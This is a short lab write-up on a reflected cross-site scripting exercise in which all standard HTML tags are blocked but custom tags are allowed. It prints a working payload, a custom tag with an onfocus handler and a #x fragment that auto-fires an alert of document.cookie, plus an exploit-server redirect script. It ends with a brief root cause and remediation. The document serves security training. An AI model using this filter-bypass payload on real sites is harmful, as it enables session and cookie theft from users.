# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

## Goal
 - To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.

## Enumeration
 -  HTML tags are filtered by the application. However, custom tags are accepted and rendered by the browser.
 - custom tags are allowed

## Testting
 - custom tags are renders like html
 - attributes are allowed

## Exploitation
 - payload should be insta-triggered, I will use onfocus attribute
 Final payload:
```
<xss onfocus='alert(document.cookie)' id='x' tabindex="1">
```
And then use link in exploit server
```
<script>
Location= 'https://LAB-ID.web-security-academy.net/?search=%3Cxss+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27x%27+tabindex%3D%221%22%3E#x'
</script>
```
"#x" in here will will make user focus on our payload, so it will instantly execute.
The tabindex attribute makes the custom element focusable.

## Root cause
 - custom tags not restricted

## Remediation 
 - restrict custom tags
